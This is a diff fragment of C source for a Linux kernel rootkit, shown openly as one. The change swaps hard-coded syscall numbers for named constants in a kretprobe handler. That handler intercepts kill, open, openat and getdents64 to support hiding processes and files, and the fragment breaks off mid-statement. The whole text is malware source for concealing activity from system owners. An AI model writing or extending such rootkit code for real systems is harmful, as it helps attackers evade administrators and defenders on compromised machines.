@@ -8,24 +8,30 @@
 
 struct kretprobe kp;
 
+const int KILL_SYSCALL = 62;
+const int OPEN_AT_SYSCALL = 257;
+const int OPEN_SYSCALL = 2;
+const int GETDENTS64_SYSCALL = 217;
+
 static int syscall_entry(struct kretprobe_instance *k, struct pt_regs *regs) {
   struct pt_regs *syscall_regs = (struct pt_regs *)regs->di;
   struct rootkit_cmd *data = (struct rootkit_cmd *)k->data;
   data->syscall = UNKNOWN;
 
   int syscall_number = *(int *)&syscall_regs->orig_ax;
-  if (syscall_number == 62) {
+  if (syscall_number == KILL_SYSCALL) {
     hide_handler(syscall_regs);
     data->syscall = KILL;
-  } else if (syscall_number == 257) {
+  } else if (syscall_number == OPEN_AT_SYSCALL) {
     char *__user filename = (char *)syscall_regs->si;
     open_enter_handler(filename, data);
     data->syscall = OPEN;
-  } else if (syscall_number == 2) {
+  } else if (syscall_number == OPEN_SYSCALL) {
     char *__user filename = (char *)syscall_regs->di;
     open_enter_handler(filename, data);
     data->syscall = OPEN;
-  } else if (syscall_number == 0xd9) {
+  } else if (syscall_number == GETDENTS64_SYSCALL) {
+
     data->syscall = GET_DENTS;
     data->data.getdents_data.buf_size = *(unsigned int *)&syscall_regs->dx;
     data->data.getdents_data.entries =
